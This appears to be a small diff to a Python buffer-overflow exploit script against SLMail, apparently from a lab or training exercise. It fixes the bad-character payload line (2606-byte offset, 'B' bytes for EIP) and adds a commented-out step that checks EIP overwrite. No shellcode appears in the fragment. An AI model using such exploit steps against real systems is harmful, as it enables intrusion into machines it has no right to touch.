@@ -657,7 +657,7 @@ def determine_bad_characters(ip):
 #          "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
 #          "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
-    buffer='A'*2606 + 'B'*4 + bad_chars + 'C'*(3500-2606-4-255)
+    buffer='A'*2606 + 'B'*4 + badchars + 'C'*(3500-2606-4-255)
     connect_to_SLMail(ip, buffer)
 
 
@@ -762,6 +762,9 @@ if __name__ == "__main__":
 
 #   Send unique string to determine position of input on victim machine:
 #    attack_with_unique_string(ip)
+
+#   Checking if EIP is filled with captial 'B' letters
+#    check_values_attack_input(ip)
 
 #   Determine which characters result in a truncation of the input in the memory of the victim machine
 #    determine_bad_characters(ip)
